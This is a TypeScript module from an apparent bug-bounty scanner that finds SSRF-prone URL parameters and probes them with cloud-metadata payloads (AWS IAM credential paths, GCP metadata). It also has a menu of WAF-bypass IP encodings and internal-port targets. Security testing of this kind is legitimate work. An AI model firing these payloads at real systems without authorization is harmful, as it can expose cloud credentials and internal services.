// SSRF scanner (web2-vuln-classes SKILL §4).
//
// EPISTEMIC HONESTY is the whole design constraint here. bughunter-web has NO
// interactsh / OOB collaborator, so blind / out-of-band SSRF — the common case —
// CANNOT be confirmed. This scanner therefore:
//
//   1. Enumerates SSRF-prone parameters (url=, uri=, dest=, redirect=, img=,
//      path=, feed=, host=, port=, webhook=, callback=, … — SKILL §4 injection
//      points) from the root page's links + GET forms, and records each as an
//      INFO *candidate* with an explicit "needs an external collaborator to
//      confirm — verify manually" note and the escalating-impact payload list.
//
//   2. Runs RESPONSE-BASED probes only. A candidate is escalated ABOVE INFO
//      strictly when the RESPONSE ITSELF returns internal data:
//        - cloud-metadata content WITH credentials  -> CRITICAL
//        - cloud-metadata content (no credentials)   -> HIGH
//        - other internal content reflected back      -> MEDIUM
//      A mere connection error reflected back, or a timing delta, proves a
//      server-side fetch was attempted but NOT that internal data was retrieved,
//      so it stays INFO (recorded as a stronger candidate note).
//
// Every Finding is created UNVALIDATED via recordFinding and never passes the
// gate. Severity is never inflated beyond what the response proves.

import { probe, type ProbeResult } from "./http";
import { logLine, recordFinding, type ScanContext } from "./context";
import { resolveActiveBrain } from "@/server/brain";
import type { Severity } from "@prisma/client";

const MAX_CANDIDATES = 8;
const PROBE_TIMEOUT = 10_000;

// SSRF-prone parameter names (SKILL §4 injection points + common synonyms).
const SSRF_PARAM_RE =
  /^(url|uri|link|src|source|dest|destination|redirect|redirect_uri|redirect_url|redir|return|returnurl|return_url|next|continue|img|image|image_url|imageurl|avatar|avatar_url|photo|file|path|feed|rss|host|hostname|port|domain|site|proxy|fetch|load|open|target|callback|webhook|out|goto|forward|view|resource|remote|upstream)$/i;

// A benign, explicitly-attacker-style collaborator marker. We have no OOB
// listener, so a hit here can never be *observed* — it exists only so the
// candidate note shows the exact value a human should replay against their own
// collaborator.
const OOB_MARKER = "http://bughunter-ssrf-probe.example.invalid/";

// Cloud-metadata payloads (response content, if returned, is the proof). The
// decimal form of 169.254.169.254 is included as a light WAF-bypass variant.
const METADATA_PAYLOADS: ReadonlyArray<{ label: string; url: string }> = [
  { label: "AWS IMDSv1 meta-data root", url: "http://169.254.169.254/latest/meta-data/" },
  {
    label: "AWS IMDSv1 IAM credentials",
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  },
  {
    label: "AWS IMDSv1 (decimal-IP bypass)",
    url: "http://2852039166/latest/meta-data/",
  },
  {
    label: "GCP metadata (needs Metadata-Flavor header, often fails)",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/",
  },
];

// A near-certainly-closed internal port: a reflected connection error here is a
// weak (INFO-only) signal that the server performed a server-side fetch.
const INTERNAL_ERROR_PAYLOAD = "http://127.0.0.1:1/";

// Markers that, if present in the response body, prove internal RETRIEVAL.
const CRED_MARKERS =
  /AccessKeyId|SecretAccessKey|"Token"\s*:|aws_access_key|aws_secret|x-amz-security-token/i;
const METADATA_MARKERS =
  /ami-id|instance-id|instance-type|security-credentials|iam\/|placement\/|local-ipv4|local-hostname|reservation-id|computeMetadata|service-accounts|public-keys/i;
// A reflected server-side-fetch error (attempt proven, retrieval NOT proven).
const FETCH_ERROR_MARKERS =
  /ECONNREFUSED|ECONNRESET|ETIMEDOUT|EHOSTUNREACH|ENETUNREACH|connection refused|connection reset|failed to connect|getaddrinfo|dial tcp|no route to host|network is unreachable|proxy error|curl:/i;

interface Candidate {
  /** The same-origin URL (or form action) carrying the param. */
  url: string;
  /** The SSRF-prone parameter name. */
  param: string;
  /** Where it came from, for the note. */
  via: "query" | "form";
}

/** Collect same-origin URLs from href/src/action + absolute links. */
function extractUrls(html: string, baseUrl: string, host: string): string[] {
  const out = new Set<string>();
  const add = (raw: string) => {
    try {
      const abs = new URL(raw, baseUrl);
      if (abs.host === host && /^https?:$/.test(abs.protocol)) out.add(abs.toString());
    } catch {
      /* ignore malformed */
    }
  };
  for (const m of html.matchAll(/(?:href|src|action)\s*=\s*["']([^"']+)["']/gi)) add(m[1]);
  for (const m of html.matchAll(/https?:\/\/[^\s"'<>]+/gi)) add(m[0]);
  return [...out];
}

/** Candidates from query strings of same-origin URLs. */
function candidatesFromUrls(urls: string[]): Candidate[] {
  const out: Candidate[] = [];
  for (const u of urls) {
    let parsed: URL;
    try {
      parsed = new URL(u);
    } catch {
      continue;
    }
    for (const key of parsed.searchParams.keys()) {
      if (SSRF_PARAM_RE.test(key)) out.push({ url: u, param: key, via: "query" });
    }
  }
  return out;
}

/** Candidates from GET <form> actions whose inputs carry an SSRF-prone name. */
function candidatesFromForms(html: string, baseUrl: string, host: string): Candidate[] {
  const out: Candidate[] = [];
  for (const fm of html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form>/gi)) {
    const attrs = fm[1];
    const inner = fm[2];
    const method = (/\bmethod\s*=\s*["']?([a-z]+)/i.exec(attrs)?.[1] ?? "get").toLowerCase();
    if (method !== "get") continue; // we only issue GET probes
    const actionRaw = /\baction\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] ?? "";
    let action: URL;
    try {
      action = new URL(actionRaw || baseUrl, baseUrl);
    } catch {
      continue;
    }
    if (action.host !== host || !/^https?:$/.test(action.protocol)) continue;
    for (const nm of inner.matchAll(/<(?:input|textarea|select)\b[^>]*\bname\s*=\s*["']([^"']+)["']/gi)) {
      const name = nm[1];
      if (SSRF_PARAM_RE.test(name)) out.push({ url: action.toString(), param: name, via: "form" });
    }
  }
  return out;
}

/** De-dup candidates on (origin+path, param), capped. */
function dedupe(cands: Candidate[]): Candidate[] {
  const seen = new Set<string>();
  const out: Candidate[] = [];
  for (const c of cands) {
    let key: string;
    try {
      const u = new URL(c.url);
      key = `${u.origin}${u.pathname}|${c.param.toLowerCase()}`;
    } catch {
      key = `${c.url}|${c.param.toLowerCase()}`;
    }
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(c);
    if (out.length >= MAX_CANDIDATES) break;
  }
  return out;
}

/** Build the candidate URL with `param` set to `value`. */
function withParam(url: string, param: string, value: string): string {
  const u = new URL(url);
  u.searchParams.set(param, value);
  return u.toString();
}

/** Classify a metadata-probe response: what, if anything, it proves. */
function classifyMetadataResponse(
  r: ProbeResult,
): { sev: Severity; proof: string } | null {
  if (r.error || r.status === 0 || r.bodyLen === 0) return null;
  // The response body is the proof — it must actually carry metadata content.
  if (CRED_MARKERS.test(r.body)) {
    return {
      sev: "CRITICAL",
      proof: "response returned cloud-metadata CREDENTIAL material (IAM keys/token)",
    };
  }
  if (METADATA_MARKERS.test(r.body)) {
    return { sev: "HIGH", proof: "response returned cloud-metadata content" };
  }
  return null;
}

const MANUAL_NOTE =
  "SSRF candidate — bughunter-web has NO interactsh/OOB collaborator, so " +
  "blind/out-of-band SSRF cannot be confirmed here. Verify manually: set the " +
  "parameter to a collaborator URL you control and watch for the callback, then " +
  "escalate per SKILL §4 (DNS-only = Informational, internal service = Medium, " +
  "cloud metadata = High, metadata + key exfil = Critical).";

function payloadMenu(url: string, param: string): string {
  const show = (v: string) => withParam(url, param, v);
  return [
    "Escalating payloads to try manually:",
    `  OOB / DNS  : ${show("http://<your-collaborator>/")}`,
    `  AWS IMDS   : ${show("http://169.254.169.254/latest/meta-data/iam/security-credentials/")}`,
    `  GCP meta   : ${show("http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google)")}`,
    `  Internal   : ${show("http://localhost:6379/")}  (Redis) / :9200 (ES) / :2375 (Docker API)`,
    "IP-bypass variants if a WAF blocks the above: 2130706433 (decimal), " +
      "0x7f000001 (hex), 127.1 (short), [::1] / [::ffff:127.0.0.1] (IPv6), " +
      "127.0.0.1.nip.io (DNS rebind), 169.254.169.254 -> 2852039166 (decimal).",
  ].join("\n");
}

export async function runSsrf(ctx: ScanContext): Promise<void> {
  await logLine(ctx.scanRunId, `[ssrf] scanning ${ctx.baseUrl} for SSRF-prone parameters`);

  let host: string;
  try {
    host = new URL(ctx.baseUrl).host;
  } catch {
    await logLine(ctx.scanRunId, `[ssrf] invalid baseUrl ${ctx.baseUrl}`, "STDERR");
    return;
  }

  const root = await probe(ctx.baseUrl, { timeoutMs: PROBE_TIMEOUT });
  if (root.error) {
    await logLine(ctx.scanRunId, `[ssrf] could not fetch ${ctx.baseUrl}: ${root.error}`, "STDERR");
    return;
  }

  const urls = extractUrls(root.body, ctx.baseUrl, host);
  const candidates = dedupe([
    ...candidatesFromUrls(urls),
    ...candidatesFromForms(root.body, ctx.baseUrl, host),
  ]);

  await logLine(
    ctx.scanRunId,
    `[ssrf] ${urls.length} same-origin URL(s), ${candidates.length} SSRF-prone param candidate(s)`,
  );

  if (candidates.length === 0) {
    await logLine(
      ctx.scanRunId,
      "[ssrf] no SSRF-prone parameters on the root page — nothing to flag " +
        "(crawl deeper / inspect JSON bodies + SVG upload for webhook/avatar_url sinks)",
    );
    return;
  }

  // Optional: let the active provider point at the likeliest SSRF feature.
  const brain = await resolveActiveBrain(ctx.userId).catch(() => null);
  let aiHint = "";
  if (brain) {
    aiHint = await brain
      .chat(
        "You are a bug-bounty assistant. Be terse.",
        "Which of these parameters is most likely a server-side fetch (SSRF) sink, and why (one line each)?\n" +
          candidates.map((c) => `- ${c.param} on ${c.url}`).join("\n"),
        { maxTokens: 300, temperature: 0.2 },
      )
      .catch(() => "");
  }

  for (const c of candidates) {
    // --- Response-based escalation attempts (metadata = the one real proof). ---
    let escalated = false;
    for (const mp of METADATA_PAYLOADS) {
      let target: string;
      try {
        target = withParam(c.url, c.param, mp.url);
      } catch {
        continue;
      }
      const res = await probe(target, { timeoutMs: PROBE_TIMEOUT });
      const verdict = classifyMetadataResponse(res);
      if (verdict) {
        await recordFinding(ctx, {
          title: `SSRF confirmed via response content — ${c.param} (${mp.label})`,
          vulnClass: "SSRF",
          severity: verdict.sev,
          confidence: "PROVEN",
          location: target,
          description:
            `The "${c.param}" parameter caused a server-side fetch whose RESPONSE ` +
            `proves internal data retrieval: ${verdict.proof}. This is confirmed by ` +
            `the response body itself (no OOB collaborator required).\n\n` +
            `${verdict.sev === "CRITICAL" ? "Rotate the exposed credentials immediately. " : ""}` +
            `Confirm the exact blast radius manually and capture a /poc bundle.`,
          evidence:
            `Request param set to: ${mp.url}\n` +
            `Response: status=${res.status} bytes=${res.bodyLen} ${res.ms}ms\n` +
            `Body (truncated):\n${res.body.slice(0, 1200)}`,
        });
        escalated = true;
        break; // one confirmed metadata hit per param is enough
      }
    }
    if (escalated) continue;

    // --- Weak INFO signal: reflected server-side-fetch error (attempt proven,
    //     NOT retrieval — so it stays INFO per the epistemic rule). ---
    let errorSignal = "";
    try {
      const errTarget = withParam(c.url, c.param, INTERNAL_ERROR_PAYLOAD);
      const errRes = await probe(errTarget, { timeoutMs: PROBE_TIMEOUT });
      if (!errRes.error && FETCH_ERROR_MARKERS.test(errRes.body)) {
        errorSignal =
          `\n\nWeak signal: pointing "${c.param}" at ${INTERNAL_ERROR_PAYLOAD} made the ` +
          `response reflect a connection error, which proves the server performed a ` +
          `server-side fetch — but NOT that internal data was retrieved, so this stays INFO. ` +
          `A collaborator replay is still required to confirm real SSRF impact.`;
      }
    } catch {
      /* best-effort */
    }

    await recordFinding(ctx, {
      title: `SSRF candidate — ${c.param} (${c.via})`,
      vulnClass: "SSRF",
      severity: "INFO",
      confidence: "CANDIDATE",
      location: withParam(c.url, c.param, OOB_MARKER),
      description:
        `The "${c.param}" parameter (found in a ${c.via}) matches a known SSRF ` +
        `injection point. ${MANUAL_NOTE}${errorSignal}\n\n${payloadMenu(c.url, c.param)}`,
      evidence: aiHint ? `AI assessment of candidate params:\n${aiHint}` : undefined,
    });
  }

  await logLine(ctx.scanRunId, "[ssrf] done");
}
